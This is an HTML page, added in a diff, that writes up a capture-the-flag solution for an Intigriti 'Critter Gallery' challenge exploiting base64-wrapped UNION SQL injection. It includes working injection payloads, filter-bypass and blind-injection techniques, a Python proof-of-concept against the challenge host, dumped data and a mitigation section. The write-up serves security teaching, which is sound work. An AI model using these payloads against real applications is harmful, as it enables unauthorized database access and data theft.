@@ -1,0 +1,476 @@
+<title>Critter Gallery</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;0,800;1,400&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:        #05080a;
+    --bg-2:      #0a1014;
+    --panel:     #0b1216;
+    --panel-2:   #0f171c;
+    --line:      #16242a;
+    --line-hot:  #1d3f3a;
+    --green:     #22ff9c;   /* phosphor */
+    --green-dim: #2ea179;
+    --cyan:      #35e0f0;
+    --amber:     #ffb454;
+    --magenta:   #ff4d7d;
+    --text:      #b8d8cc;
+    --text-hi:   #e6fff4;
+    --muted:     #5c7a72;
+    --comment:   #46615a;
+    --mono:      "JetBrains Mono", ui-monospace, Menlo, monospace;
+    --term:      "Share Tech Mono", "JetBrains Mono", monospace;
+  }
+
+  * { box-sizing: border-box; }
+  html { background: var(--bg); }
+  body {
+    margin: 0;
+    background:
+      radial-gradient(900px 500px at 15% -8%, #0c1f1a 0, transparent 55%),
+      radial-gradient(800px 460px at 100% 0%, #10202b 0, transparent 50%),
+      var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 15px;
+    line-height: 1.72;
+    padding-block: 0 80px;
+    -webkit-font-smoothing: antialiased;
+  }
+  /* CRT scanline overlay */
+  body::before {
+    content: "";
+    position: fixed;
+    inset: 0;
+    pointer-events: none;
+    background: repeating-linear-gradient(
+      0deg, rgba(0,0,0,0) 0, rgba(0,0,0,0) 2px, rgba(0,20,15,.16) 3px, rgba(0,0,0,0) 4px);
+    mix-blend-mode: overlay;
+    z-index: 50;
+  }
+  .wrap { max-width: 860px; margin: 0 auto; padding: 0 20px; }
+
+  a { color: var(--cyan); text-decoration: none; }
+  a:hover { text-decoration: underline; text-shadow: 0 0 8px rgba(53,224,240,.5); }
+
+  /* ── Terminal window chrome ── */
+  .terminal {
+    margin-top: 34px;
+    border: 1px solid var(--line-hot);
+    border-radius: 10px;
+    background: linear-gradient(180deg, var(--panel), var(--bg-2));
+    box-shadow: 0 0 0 1px rgba(34,255,156,.04), 0 30px 80px rgba(0,0,0,.6), 0 0 60px rgba(34,255,156,.04) inset;
+    overflow: hidden;
+  }
+  .tbar {
+    display: flex; align-items: center; gap: 8px;
+    padding: 11px 15px;
+    background: #0c1519;
+    border-bottom: 1px solid var(--line);
+  }
+  .tbar .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dot.r { background:#ff5f57; } .dot.y { background:#febc2e; } .dot.g { background:#28c840; }
+  .tbar .path {
+    margin-left: 12px;
+    font-family: var(--term);
+    font-size: 12.5px;
+    color: var(--muted);
+    letter-spacing: .04em;
+  }
+  .tbody { padding: 26px 26px 30px; }
+
+  /* ── Hero banner ── */
+  .banner {
+    font-family: var(--term);
+    color: var(--green);
+    font-size: clamp(6.5px, 1.9vw, 15px);
+    line-height: 1.12;
+    margin: 0 0 6px;
+    white-space: pre;
+    overflow-x: auto;
+    text-shadow: 0 0 12px rgba(34,255,156,.45);
+  }
+  .tagline {
+    color: var(--comment);
+    font-size: 13.5px;
+    margin: 10px 0 22px;
+  }
+  .tagline::before { content: "// "; color: var(--green-dim); }
+
+  .prompt { color: var(--green); }
+  .prompt::before { content: "root@critter"; color: var(--cyan); }
+  .prompt .at { color: var(--muted); }
+  .cursor {
+    display: inline-block; width: 9px; height: 16px;
+    background: var(--green); margin-left: 3px;
+    vertical-align: -2px;
+    box-shadow: 0 0 8px rgba(34,255,156,.7);
+    animation: blink 1.1s steps(1) infinite;
+  }
+  @keyframes blink { 50% { opacity: 0; } }
+  @media (prefers-reduced-motion: reduce) { .cursor { animation: none; } }
+
+  /* meta grid */
+  .meta {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+    gap: 10px;
+    margin: 20px 0 6px;
+  }
+  .meta div {
+    border: 1px solid var(--line);
+    border-left: 2px solid var(--green-dim);
+    border-radius: 6px;
+    padding: 9px 13px;
+    background: var(--panel-2);
+  }
+  .meta dt { font-size: 10.5px; letter-spacing: .16em; text-transform: uppercase; color: var(--muted); margin: 0 0 2px; }
+  .meta dd { margin: 0; color: var(--text-hi); font-size: 14px; font-weight: 500; }
+  .meta dd a { color: var(--cyan); }
+
+  .flagline {
+    margin-top: 18px;
+    border: 1px dashed var(--green-dim);
+    border-radius: 8px;
+    padding: 14px 16px;
+    background: rgba(34,255,156,.04);
+    display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
+  }
+  .flagline .k { color: var(--green); font-size: 12px; letter-spacing: .12em; }
+  .flagline code { color: var(--green); font-weight: 700; word-break: break-all; text-shadow: 0 0 10px rgba(34,255,156,.4); }
+
+  /* ── Sections ── */
+  section { margin-top: 46px; scroll-margin-top: 18px; }
+  h2 {
+    font-family: var(--mono);
+    font-weight: 800;
+    font-size: 21px;
+    color: var(--text-hi);
+    margin: 0 0 6px;
+    letter-spacing: -.01em;
+  }
+  h2::before {
+    content: "$ ";
+    color: var(--green);
+    font-weight: 700;
+  }
+  .h2-sub { color: var(--comment); font-size: 12.5px; margin: 0 0 20px; padding-left: 15px; border-left: 1px solid var(--line); }
+
+  h3 { font-size: 15px; font-weight: 700; color: var(--cyan); margin: 26px 0 10px; }
+  h3::before { content: "> "; color: var(--green-dim); }
+  p { margin: 0 0 15px; }
+  strong { color: var(--text-hi); font-weight: 700; }
+  em { color: var(--amber); font-style: normal; }
+
+  /* code */
+  pre {
+    background: #04070a;
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 15px 17px;
+    overflow-x: auto;
+    margin: 0 0 16px;
+    position: relative;
+  }
+  pre code { font-family: var(--mono); font-size: 12.8px; line-height: 1.7; color: var(--text); white-space: pre; }
+  :not(pre) > code {
+    font-family: var(--mono); font-size: .87em;
+    background: var(--panel-2); border: 1px solid var(--line);
+    border-radius: 4px; padding: 1px 6px; color: var(--amber);
+    word-break: break-word;
+  }
+  .cm { color: var(--comment); }
+  .gr { color: var(--green); }
+  .cy { color: var(--cyan); }
+  .am { color: var(--amber); }
+  .mg { color: var(--magenta); }
+  .kw { color: var(--magenta); }
+  .st { color: var(--green); }
+  .out::before { content: "  ⟶ "; color: var(--green-dim); }
+
+  /* callout */
+  .note {
+    border: 1px solid var(--line-hot);
+    border-left: 3px solid var(--green);
+    background: rgba(34,255,156,.035);
+    border-radius: 0 8px 8px 0;
+    padding: 13px 16px; margin: 0 0 16px; font-size: 14px;
+  }
+  .note.warn { border-left-color: var(--magenta); background: rgba(255,77,125,.05); }
+  .note.warn strong { color: var(--magenta); }
+  .note .tag { color: var(--green); font-weight: 700; }
+  .note.warn .tag { color: var(--magenta); }
+
+  /* step */
+  .step { display: flex; gap: 15px; margin-bottom: 4px; }
+  .step-n {
+    flex-shrink: 0; width: 30px; height: 30px; margin-top: 2px;
+    border: 1px solid var(--green-dim); border-radius: 6px;
+    color: var(--green); font-weight: 700; font-size: 13px;
+    display: grid; place-items: center;
+    box-shadow: 0 0 12px rgba(34,255,156,.15) inset;
+  }
+  .step-b { flex: 1; min-width: 0; }
+  .step-b h3 { margin-top: 1px; }
+
+  /* tables */
+  .scroll { overflow-x: auto; margin: 0 0 16px; border: 1px solid var(--line); border-radius: 8px; }
+  table { border-collapse: collapse; width: 100%; font-size: 12.8px; }
+  th, td { text-align: left; padding: 8px 13px; border-bottom: 1px solid var(--line); vertical-align: top; }
+  th { font-size: 10px; letter-spacing: .13em; text-transform: uppercase; color: var(--green-dim); background: #081014; white-space: nowrap; }
+  tr:last-child td { border-bottom: none; }
+  tbody tr:hover { background: rgba(34,255,156,.03); }
+  td.n { color: var(--green); font-weight: 700; text-align: center; width: 32px; }
+  td .p { color: var(--amber); word-break: break-all; }
+  td.num { text-align: right; font-variant-numeric: tabular-nums; color: var(--cyan); }
+  .ok { color: var(--green); }
+  .bad { color: var(--magenta); }
+
+  .dump {
+    background: #04070a; border: 1px solid var(--line);
+    border-radius: 8px; padding: 15px 17px;
+    font-size: 12.6px; line-height: 1.95; overflow-x: auto; margin-bottom: 16px;
+  }
+  .dump .id { color: var(--cyan); }
+  .dump .fl { color: var(--green); text-shadow: 0 0 8px rgba(34,255,156,.4); }
+
+  .grp { font-size: 10.5px; letter-spacing: .16em; text-transform: uppercase; color: var(--muted); margin: 22px 0 9px; display: flex; align-items: center; gap: 11px; }
+  .grp::before { content: "##"; color: var(--green-dim); }
+  .grp::after { content: ""; flex: 1; height: 1px; background: var(--line); }
+
+  ul { padding-left: 0; list-style: none; }
+  ul li { padding-left: 18px; position: relative; margin-bottom: 6px; }
+  ul li::before { content: "▸"; position: absolute; left: 0; color: var(--green-dim); }
+
+  footer {
+    margin-top: 44px; padding-top: 20px; border-top: 1px solid var(--line);
+    color: var(--comment); font-size: 12.5px;
+  }
+  footer::before { content: "// EOF — "; color: var(--green-dim); }
+</style>
+
+<div class="wrap">
+  <div class="terminal">
+    <div class="tbar">
+      <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+      <span class="path">~/intigriti/0926 — sqli — 80×24</span>
+    </div>
+    <div class="tbody">
+
+      <pre class="banner"> ██████╗██████╗ ██╗████████╗████████╗███████╗██████╗
+██╔════╝██╔══██╗██║╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗
+██║     ██████╔╝██║   ██║      ██║   █████╗  ██████╔╝
+██║     ██╔══██╗██║   ██║      ██║   ██╔══╝  ██╔══██╗
+╚██████╗██║  ██║██║   ██║      ██║   ███████╗██║  ██║
+ ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝
+        G A L L E R Y   ·   S Q L i   W R I T E - U P</pre>
+      <p class="tagline">a cute animal gallery hiding a one-column UNION injection</p>
+
+      <div>
+        <span class="prompt"><span class="at">:</span>~# </span><span class="gr">whoami &amp;&amp; cat challenge.info</span><span class="cursor"></span>
+      </div>
+
+      <dl class="meta">
+        <div><dt>Target</dt><dd>challenge-0926</dd></div>
+        <div><dt>Category</dt><dd>SQL Injection</dd></div>
+        <div><dt>Author</dt><dd><a href="https://x.com/khanhdlq" target="_blank" rel="noopener">khanhdlq</a></dd></div>
+        <div><dt>Stack</dt><dd>PHP 8.2 · MySQL 8.0</dd></div>
+      </dl>
+
+      <div class="flagline">
+        <span class="k">[ FLAG CAPTURED ]</span>
+        <code>INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</code>
+      </div>
+
+      <section>
+        <h2>overview</h2>
+        <p class="h2-sub">recon/target-profile.txt</p>
+        <p>The target is a small PHP app, <strong>Critter Gallery</strong> — a grid of eight animals. Each tile loads a detail view through a <code>?pic=</code> parameter carrying a <strong>base64-encoded</strong> animal name.</p>
+        <pre><code>https://challenge-0926.challenges.intigriti.io/challenge.php?pic=<span class="am">Zm94</span>
+                                                                  <span class="gr">└── base64("fox")</span></code></pre>
+        <p>The decoded value is consumed server-side. The whole challenge is finding out <em>where</em> it lands.</p>
+      </section>
+
+      <section>
+        <h2>recon</h2>
+        <p class="h2-sub">recon/enumerate.log</p>
+        <p>The gallery markup hands us the encoding scheme:</p>
+        <pre><code>&lt;a href="?pic=Zm94"&gt;      <span class="cm"># fox</span>
+&lt;a href="?pic=cGFuZGE="&gt;  <span class="cm"># panda</span>
+&lt;a href="?pic=bGlvbg=="&gt;  <span class="cm"># lion</span></code></pre>
+        <p>And the headers leak the stack:</p>
+        <pre><code><span class="prompt2">$</span> curl -sI .../challenge.php | grep -i powered
+<span class="out">x-powered-by: PHP/8.2.33</span>
+<span class="out">server: istio-envoy</span></code></pre>
+      </section>
+
+      <section>
+        <h2>discovery</h2>
+        <p class="h2-sub">exploit/confirm-injection.sh</p>
+        <p>Encode a single quote — <code>fox'</code> → <code>Zm94Jw==</code> — and fire it:</p>
+        <pre><code><span class="prompt2">$</span> curl -s ".../challenge.php?pic=Zm94Jw=="
+<span class="out"><span class="bad">HTTP 200 · 0 bytes  ← query broke</span></span></code></pre>
+        <div class="note"><span class="tag">[+]</span> A broken query returns an empty body. Escaping the quote (<code>fox''</code>) restores the 4090-byte page. <strong>SQL injection confirmed.</strong></div>
+        <h3>column count</h3>
+        <div class="scroll"><table>
+          <thead><tr><th>Payload</th><th>Result</th></tr></thead>
+          <tbody>
+            <tr><td><span class="p">x' UNION SELECT null-- </span></td><td class="ok">4123 B ✓</td></tr>
+            <tr><td><span class="p">x' UNION SELECT null,null-- </span></td><td class="bad">0 B ✗</td></tr>
+          </tbody>
+        </table></div>
+        <p>One column. A clean UNION channel straight into the rendered page.</p>
+      </section>
+
+      <section>
+        <h2>exploitation</h2>
+        <p class="h2-sub">exploit/dump-chain.sh</p>
+
+        <div class="step"><div class="step-n">1</div><div class="step-b">
+          <h3>confirm</h3>
+          <pre><code><span class="cm"># fox' → base64</span>
+Zm94Jw==  <span class="out"><span class="bad">200, 0 bytes = error</span></span></code></pre>
+        </div></div>
+
+        <div class="step"><div class="step-n">2</div><div class="step-b">
+          <h3>fingerprint</h3>
+          <pre><code>x' UNION SELECT version()--   <span class="out"><span class="gr">8.0.46</span></span>
+x' UNION SELECT database()--  <span class="out"><span class="gr">critter_gallery</span></span></code></pre>
+        </div></div>
+
+        <div class="step"><div class="step-n">3</div><div class="step-b">
+          <h3>enumerate</h3>
+          <pre><code>x' UNION SELECT group_concat(table_name) FROM
+  information_schema.tables WHERE table_schema=database()--
+<span class="out"><span class="gr">animals, secret_vault</span></span>
+
+x' UNION SELECT group_concat(column_name) FROM
+  information_schema.columns WHERE table_name='secret_vault'--
+<span class="out"><span class="gr">id, note</span></span></code></pre>
+        </div></div>
+
+        <div class="step"><div class="step-n">4</div><div class="step-b">
+          <h3>exfil</h3>
+          <pre><code>x' UNION SELECT note FROM secret_vault LIMIT 1--
+<span class="out"><span class="gr">INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</span></span></code></pre>
+        </div></div>
+      </section>
+
+      <section>
+        <h2>loot</h2>
+        <p class="h2-sub">loot/full-dump.txt</p>
+        <div class="grp">animals</div>
+        <div class="dump"><span class="id">1</span>|fox|The red fox is a clever, highly adaptable hunter.
+<span class="id">2</span>|panda|Giant pandas spend most of the day munching bamboo.
+<span class="id">3</span>|lion|Lions are the only truly social of the big cats.
+<span class="id">4</span>|penguin|Penguins are flightless birds of the southern seas.
+<span class="id">5</span>|otter|Sea otters hold hands while they sleep so they do not drift apart.
+<span class="id">6</span>|koala|Koalas sleep up to twenty hours a day.
+<span class="id">7</span>|owl|Owls can rotate their heads around 270 degrees.
+<span class="id">8</span>|tiger|Tigers are the largest of all wild cats.</div>
+        <div class="grp">secret_vault</div>
+        <div class="dump"><span class="id">1</span> | <span class="fl">INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</span></div>
+        <div class="grp">host</div>
+        <div class="scroll"><table><tbody>
+          <tr><th>db user</th><td><code>gallery@10.18.49.50</code></td></tr>
+          <tr><th>hostname</th><td><code>db-7df4c4d979-qvq6s</code> · k8s pod</td></tr>
+          <tr><th>os</th><td>Linux</td></tr>
+          <tr><th>mysql</th><td>8.0.46 Community</td></tr>
+          <tr><th>secure_file_priv</th><td><code>/var/lib/mysql-files/</code> — LOAD_FILE / OUTFILE blocked</td></tr>
+        </tbody></table></div>
+      </section>
+
+      <section>
+        <h2>arsenal</h2>
+        <p class="h2-sub">notes/37-confirmed-methods.md</p>
+        <p>The injection point is wildly permissive — <strong>37 techniques</strong> confirmed live. A sample per class:</p>
+
+        <div class="grp">direct · single request</div>
+        <div class="scroll"><table>
+          <thead><tr><th>#</th><th>Method</th><th>Payload</th></tr></thead>
+          <tbody>
+            <tr><td class="n">01</td><td>UNION</td><td><span class="p">x' UNION SELECT note FROM secret_vault LIMIT 1-- </span></td></tr>
+            <tr><td class="n">04</td><td>comment</td><td><span class="p">x'/**/UNION/**/SELECT/**/note/**/FROM/**/secret_vault-- </span></td></tr>
+            <tr><td class="n">07</td><td>JSON_OBJECT</td><td><span class="p">x' UNION SELECT JSON_OBJECT('flag',note) FROM secret_vault-- </span></td></tr>
+            <tr><td class="n">08</td><td>hex LIKE</td><td><span class="p">... WHERE note LIKE 0x494e544947524954497b2525-- </span></td></tr>
+            <tr><td class="n">15</td><td>mixed case</td><td><span class="p">x' uNiOn SeLeCt note FrOm secret_vault-- </span></td></tr>
+            <tr><td class="n">21</td><td>HPP</td><td><span class="p">?pic=Zm94&amp;pic=&lt;sqli&gt;</span></td></tr>
+          </tbody>
+        </table></div>
+
+        <div class="grp">boolean blind · ~14 B delta</div>
+        <div class="scroll"><table>
+          <thead><tr><th>#</th><th>Method</th><th class="num">true</th><th class="num">false</th></tr></thead>
+          <tbody>
+            <tr><td class="n">22</td><td>IF()</td><td class="num">4136</td><td class="num">4122</td></tr>
+            <tr><td class="n">23</td><td>CASE WHEN</td><td class="num">4158</td><td class="num">4144</td></tr>
+            <tr><td class="n">24</td><td>STRCMP()</td><td class="num">4138</td><td class="num">4124</td></tr>
+            <tr><td class="n">28</td><td>REGEXP</td><td class="num">4137</td><td class="num">4122</td></tr>
+            <tr><td class="n">30</td><td>EXISTS()</td><td class="num">4141</td><td class="num">4126</td></tr>
+          </tbody>
+        </table></div>
+
+        <div class="grp">time blind</div>
+        <div class="scroll"><table>
+          <thead><tr><th>#</th><th>Method</th><th class="num">hit</th><th class="num">miss</th></tr></thead>
+          <tbody>
+            <tr><td class="n">33</td><td>IF + SLEEP</td><td class="num">2.6s</td><td class="num">0.5s</td></tr>
+            <tr><td class="n">35</td><td>cartesian (no SLEEP)</td><td class="num">5.8s</td><td class="num">0.6s</td></tr>
+          </tbody>
+        </table></div>
+        <p style="color:var(--comment);font-size:13px"><span class="cm"># dead ends: error-based (errors suppressed), stacked queries (driver blocks), LOAD_FILE / OUTFILE (no FILE priv)</span></p>
+      </section>
+
+      <section>
+        <h2>poc</h2>
+        <p class="h2-sub">exploit/poc.py</p>
+        <pre><code><span class="cm">#!/usr/bin/env python3</span>
+<span class="kw">import</span> base64, urllib.parse, urllib.request, re
+
+TARGET = <span class="st">"https://challenge-0926.challenges.intigriti.io/challenge.php"</span>
+
+<span class="kw">def</span> <span class="cy">inject</span>(payload):
+    b64  = base64.b64encode(payload.encode()).decode()
+    url  = f<span class="st">"{TARGET}?pic={urllib.parse.quote(b64)}"</span>
+    resp = urllib.request.urlopen(url, timeout=10).read().decode()
+    m    = re.search(r<span class="st">'class="desc">(.*?)&lt;/div>'</span>, resp, re.DOTALL)
+    <span class="kw">return</span> re.sub(r<span class="st">"&lt;br/?>"</span>, <span class="st">""</span>, m.group(1)).strip() <span class="kw">if</span> m <span class="kw">else</span> <span class="st">""</span>
+
+print(inject(<span class="st">"x' UNION SELECT version()-- "</span>))                    <span class="cm"># 8.0.46</span>
+print(inject(<span class="st">"x' UNION SELECT note FROM secret_vault LIMIT 1-- "</span>)) <span class="cm"># FLAG</span></code></pre>
+      </section>
+
+      <section>
+        <h2>patch</h2>
+        <p class="h2-sub">fix/mitigation.md</p>
+        <h3>parameterize</h3>
+        <pre><code><span class="cm">// vulnerable</span>
+$name = base64_decode($_GET[<span class="st">'pic'</span>]);
+$db-&gt;query(<span class="st">"SELECT description FROM animals WHERE name = '$name'"</span>);
+
+<span class="cm">// fixed</span>
+$stmt = $db-&gt;prepare(<span class="st">"SELECT description FROM animals WHERE name = ?"</span>);
+$stmt-&gt;bind_param(<span class="st">"s"</span>, $name);</code></pre>
+        <h3>allowlist</h3>
+        <pre><code>$ok = [<span class="st">'fox'</span>,<span class="st">'panda'</span>,<span class="st">'lion'</span>,<span class="st">'penguin'</span>,<span class="st">'otter'</span>,<span class="st">'koala'</span>,<span class="st">'owl'</span>,<span class="st">'tiger'</span>];
+<span class="kw">if</span> (!in_array($name, $ok, <span class="kw">true</span>)) { showNotFound(); exit; }</code></pre>
+        <div class="note warn"><span class="tag">[!]</span> <strong>Least privilege.</strong> The <code>gallery</code> user reads <code>information_schema</code> and <code>secret_vault</code>. Grant it <code>SELECT</code> on <code>animals</code> only — then a UNION leaks nothing worth having.</div>
+      </section>
+
+      <section>
+        <h2>refs</h2>
+        <p class="h2-sub">notes/refs.txt</p>
+        <ul>
+          <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener">OWASP — SQL Injection</a></li>
+          <li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener">PortSwigger — SQLi Cheat Sheet</a></li>
+          <li><a href="https://dev.mysql.com/doc/refman/8.0/en/union.html" target="_blank" rel="noopener">MySQL 8.0 — UNION</a></li>
+          <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener">PayloadsAllTheThings — SQLi</a></li>
+        </ul>
+      </section>
+
+      <footer>write-up by <a href="https://github.com/Rajib-Mahmud" target="_blank" rel="noopener">Rajib Mahmud</a> · intigriti sep 2026 · flag via 1-column UNION SQLi</footer>
+
+    </div>
+  </div>
+</div>
